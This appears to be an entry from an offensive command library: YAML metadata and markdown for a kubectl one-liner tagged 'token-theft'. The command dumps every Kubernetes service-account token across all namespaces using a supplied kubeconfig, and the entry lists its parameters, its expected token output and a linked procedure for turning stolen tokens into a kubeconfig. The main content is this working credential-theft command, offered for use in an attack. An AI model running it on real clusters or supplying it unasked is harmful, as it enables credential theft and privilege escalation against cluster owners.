---
data: >-
  kubectl --kubeconfig ingress.kubeconfig get secrets -A -o=jsonpath='{range
  .items[?(@.type=="kubernetes.io/service-account-token")]}{.metadata.namespace}{"
  "}{.metadata.name}{" "}{.data.token}{"\n"}{end}'
tags:
  - token-theft
  - kubernetes
type: command
output: List of namespace name token pairs
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:49.869Z'
id: 2fc1deb3-6fbd-4c76-a17a-e299a29beea1
verified: false
validated: true
submitted: true
---
# kubectl-dump-all-sa-tokens

## Command

```bash
kubectl --kubeconfig ingress.kubeconfig get secrets -A -o=jsonpath='{range .items[?(@.type=="kubernetes.io/service-account-token")]}{.metadata.namespace}{" "}{.metadata.name}{" "}{.data.token}{"\n"}{end}'
```

## Description

Dumps all service account tokens from secrets across namespaces using jsonpath.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--kubeconfig` | Path to kubeconfig file | Yes |
| `-A` | All namespaces | Yes |
| `-o=jsonpath` | JSONPath expression for output | Yes |

## Examples

### Basic Usage

As above.

## Expected Output

Lines like "default default-token-xxx eyJ...".

## Related

- [[procedures/Extract-Service-Account-Tokens-and-Generate-Kubeconfig]]
